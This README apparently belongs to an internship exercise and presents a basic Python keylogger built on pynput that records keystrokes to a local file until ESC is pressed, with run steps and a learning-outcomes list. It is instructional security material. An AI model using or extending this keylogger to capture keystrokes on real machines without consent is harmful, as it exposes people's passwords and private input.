# Task 4 – Keylogger Program

**SkillCraft Technology – Cybersecurity Internship**

## 📌 Objective

Create a **basic keylogger program** in Python that records keystrokes and saves them into a log file. This task is designed for **educational and cybersecurity research purposes only**. It demonstrates how attackers may capture user input and why defensive measures (antivirus, monitoring, secure input handling) are necessary.

⚠️ **Disclaimer:** This program must only be used in a controlled environment for learning. Misuse of keyloggers for unauthorized access is illegal.

---

## ⚙️ Code (Task4_Keylogger_Program.py)

```python
# Basic Keylogger - Task 04
# SkillCraft Technology Internship
# For Educational Purposes Only

from pynput import keyboard

# File where logs will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Special keys (space, enter, etc.)
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop listener with ESC
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped. Logs saved to", log_file)
```

---

## ▶️ How to Run

1. Install required library:

   ```bash
   pip install pynput
   ```

2. Save the script as **`Task4_Keylogger_Program.py`**

3. Run in terminal or IDE:

   ```bash
   python Task4_Keylogger_Program.py
   ```

4. The program will:

   * Record all keystrokes
   * Save them in `key_log.txt`
   * Stop when the **ESC** key is pressed

---

## ✅ Sample Output

**Console:**

```
Keylogger started. Press ESC to stop.
Keylogger stopped. Logs saved to key_log.txt
```

**key_log.txt file content (example):**

```
Hello [space] World [enter]
```

---

## 📖 Explanation

* Uses **pynput** library to listen to keyboard events.
* Stores characters in a log file (`key_log.txt`).
* Normal keys are recorded directly, while special keys are shown in `[ ]`.
* Pressing **ESC** cleanly stops the logger.

---

## 🔐 Learning Outcome

* Learned how keyloggers capture keystrokes.
* Understood the **ethical and legal implications** of monitoring input.
* Gained practical experience with Python event listeners.

--
